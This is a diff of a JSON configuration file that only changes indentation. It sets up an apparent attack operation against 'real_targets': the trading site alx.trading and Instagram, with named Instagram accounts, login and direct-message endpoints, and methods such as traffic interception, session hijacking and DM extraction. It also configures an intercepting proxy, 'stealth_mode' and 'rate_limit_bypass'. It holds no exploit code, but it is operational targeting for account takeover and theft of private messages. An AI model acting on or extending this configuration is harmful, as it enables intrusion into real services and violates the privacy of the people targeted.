@@ -1,47 +1,55 @@
 {
-    "real_targets": {
-        "alx_trading": {
-            "domain": "alx.trading",
-            "target_type": "trading_platform",
-            "priority": 1,
-            "methods": ["dm_extraction", "traffic_interception", "session_hijacking"],
-            "endpoints": [
-                "https://alx.trading/api/",
-                "https://alx.trading/login",
-                "https://alx.trading/dashboard",
-                "https://alx.trading/trading",
-                "https://alx.trading/portfolio"
-            ],
-            "instagram_targets": [
-                "alx.trading",
-                "alxtrading_official",
-                "alx_signals",
-                "alx_academy"
-            ]
-        },
-        "instagram_api": {
-            "domain": "instagram.com",
-            "target_type": "social_platform", 
-            "priority": 1,
-            "methods": ["dm_extraction", "profile_scraping", "session_hijacking"],
-            "endpoints": [
-                "https://www.instagram.com/api/v1/",
-                "https://i.instagram.com/api/v1/",
-                "https://graph.instagram.com/",
-                "https://www.instagram.com/accounts/login/",
-                "https://www.instagram.com/direct/"
-            ]
-        }
+  "real_targets": {
+    "alx_trading": {
+      "domain": "alx.trading",
+      "target_type": "trading_platform",
+      "priority": 1,
+      "methods": [
+        "dm_extraction",
+        "traffic_interception",
+        "session_hijacking"
+      ],
+      "endpoints": [
+        "https://alx.trading/api/",
+        "https://alx.trading/login",
+        "https://alx.trading/dashboard",
+        "https://alx.trading/trading",
+        "https://alx.trading/portfolio"
+      ],
+      "instagram_targets": [
+        "alx.trading",
+        "alxtrading_official",
+        "alx_signals",
+        "alx_academy"
+      ]
     },
-    "operation_config": {
-        "proxy_port": 8080,
-        "web_interface_port": 8081,
-        "database_path": "data/real_operations.db",
-        "logs_path": "logs/real_operations.log",
-        "sessions_path": "sessions/",
-        "stealth_mode": true,
-        "rate_limit_bypass": true,
-        "auto_retry": true,
-        "max_retries": 5
+    "instagram_api": {
+      "domain": "instagram.com",
+      "target_type": "social_platform",
+      "priority": 1,
+      "methods": [
+        "dm_extraction",
+        "profile_scraping",
+        "session_hijacking"
+      ],
+      "endpoints": [
+        "https://www.instagram.com/api/v1/",
+        "https://i.instagram.com/api/v1/",
+        "https://graph.instagram.com/",
+        "https://www.instagram.com/accounts/login/",
+        "https://www.instagram.com/direct/"
+      ]
     }
+  },
+  "operation_config": {
+    "proxy_port": 8080,
+    "web_interface_port": 8081,
+    "database_path": "data/real_operations.db",
+    "logs_path": "logs/real_operations.log",
+    "sessions_path": "sessions/",
+    "stealth_mode": true,
+    "rate_limit_bypass": true,
+    "auto_retry": true,
+    "max_retries": 5
+  }
 }
